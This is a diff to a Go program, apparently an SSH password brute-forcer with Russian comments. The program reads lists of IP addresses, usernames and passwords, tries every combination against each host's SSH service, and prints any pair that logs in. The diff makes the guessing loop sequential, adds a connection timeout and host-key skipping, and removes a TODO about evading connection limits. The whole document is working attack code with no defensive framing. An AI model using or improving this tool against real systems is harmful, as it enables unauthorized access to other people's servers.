@@ -2,15 +2,13 @@ package main
 
 import (
 	"bufio"
-	"bytes"
 	"fmt"
-	"log"
 	"os"
 	"runtime"
 	"strings"
 	"time"
 
-	"github.com/btcsuite/golangcrypto/ssh"
+	"golang.org/x/crypto/ssh"
 )
 
 // HostInfo - информация о хосте
@@ -69,12 +67,11 @@ func Prepare(iplist, userDict, passDict string) (sliceIPList, sliceUser, slicePa
 // Scan - сканирование
 func Scan(sliceIPList, sliceUser, slicePass []string) {
 	for _, hostPort := range sliceIPList {
+
 		fmt.Printf("Try to crack %s\n", hostPort)
 		t := strings.Split(hostPort, ":")
 		host := t[0]
 		port := t[1]
-		n := len(sliceUser) * len(slicePass)
-		chanScanResult := make(chan HostInfo, n)
 
 		for _, user := range sliceUser {
 			for _, passwd := range slicePass {
@@ -86,45 +83,16 @@ func Scan(sliceIPList, sliceUser, slicePass []string) {
 				HostInfo.pass = passwd
 				HostInfo.isWeak = false
 
-				go Crack(HostInfo, chanScanResult)
-				for runtime.NumGoroutine() > runtime.NumCPU()*300 {
-					time.Sleep(10 * time.Microsecond)
+				if Crack(HostInfo) {
+					fmt.Printf("User: %s, Password: %s\n", HostInfo.user, HostInfo.pass)
 				}
 			}
 		}
-		done := make(chan bool, n)
-		go func() {
-			for i := 0; i < cap(chanScanResult); i++ {
-				select {
-				case r := <-chanScanResult:
-					fmt.Println(r)
-					if r.isWeak {
-						var buf bytes.Buffer
-						logger := log.New(&buf, "logger: ", log.Ldate)
-						logger.Printf("%s:%s, user: %s, password: %s\n", r.host, r.port, r.user, r.pass)
-						fmt.Print(&buf)
-					}
-				case <-time.After(1 * time.Second):
-					// fmt.Println("timeout")
-					break
-
-				}
-				done <- true
-
-			}
-		}()
-
-		for i := 0; i < cap(done); i++ {
-			// fmt.Println(<-done)
-			<-done
-		}
-
 	}
-
 }
 
 // Crack - подбор пароля
-func Crack(HostInfo HostInfo, chanScanResult chan HostInfo) {
+func Crack(HostInfo HostInfo) bool {
 	host := HostInfo.host
 	port := HostInfo.port
 	user := HostInfo.user
@@ -136,11 +104,11 @@ func Crack(HostInfo HostInfo, chanScanResult chan HostInfo) {
 		Auth: []ssh.AuthMethod{
 			ssh.Password(passwd),
 		},
+		Timeout:         10 * time.Second,
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 	}
 	client, err := ssh.Dial("tcp", host+":"+port, config)
 	if err != nil {
-		// TODO
-		// тут надо пробивать ограничение на количество подключений
 		isOk = false
 	} else {
 		session, err := client.NewSession()
@@ -155,6 +123,5 @@ func Crack(HostInfo HostInfo, chanScanResult chan HostInfo) {
 
 	}
 
-	HostInfo.isWeak = isOk
-	chanScanResult <- HostInfo
+	return isOk
 }
